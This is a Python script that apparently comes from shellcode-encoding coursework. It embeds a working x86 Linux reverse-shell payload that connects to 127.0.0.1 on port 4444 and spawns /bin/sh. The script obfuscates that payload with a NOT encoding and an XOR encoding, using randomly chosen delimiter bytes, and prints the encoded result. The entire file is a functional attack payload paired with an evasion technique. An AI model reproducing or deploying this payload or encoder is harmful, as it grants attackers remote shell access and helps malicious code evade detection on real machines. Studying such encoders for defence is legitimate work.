#!/usr/bin/python3
# NX-Encoder.py
# Author: Michael Norris

import random


def n_encode(bytes_obj):
    return [(~byte & 0xff) for byte in bytes_obj]


def x_encode(bytes_obj):
    return [(byte ^ xor_byte) for byte in bytes_obj]


def find_unused_byte(bytes_obj):
    byte_range = [i for i in range(256)]
    xor_list = [byte for byte in byte_range if byte not in bytes_obj]
    return random.choice(xor_list)


def format_shellcode(bytes_obj, hex_format=True):
    encoded = ''
    if hex_format:
        for byte in bytes_obj:
            encoded += '0x'
            encoded += '%02x,' % byte
        encoded = encoded[:-1]
    else:
        for byte in bytes_obj:
            encoded += '\\x'
            encoded += '%02x' % byte
    return encoded


def decode_shellcode(bytes_obj):
    return n_encode(x_encode(bytes_obj))


shellcode = bytearray(b'\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x7f\x00\x00\x01\x68\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80')

n_encoded = n_encode(shellcode)

not_delimiter = find_unused_byte(n_encoded)
n_encoded.insert(0, not_delimiter)

xor_byte = find_unused_byte(n_encoded)
nx_encoded = x_encode(n_encoded)

xor_delimiter = find_unused_byte(nx_encoded)
nx_encoded.append(xor_delimiter)

formatted_shellcode = format_shellcode(nx_encoded)

print('Length: %d' % len(nx_encoded))
print('XOR Delimiter: ' + hex(xor_delimiter))
print('XOR Byte: ' + hex(xor_byte))
print('NOT Delimiter Byte: ' + hex(not_delimiter))
print(formatted_shellcode)
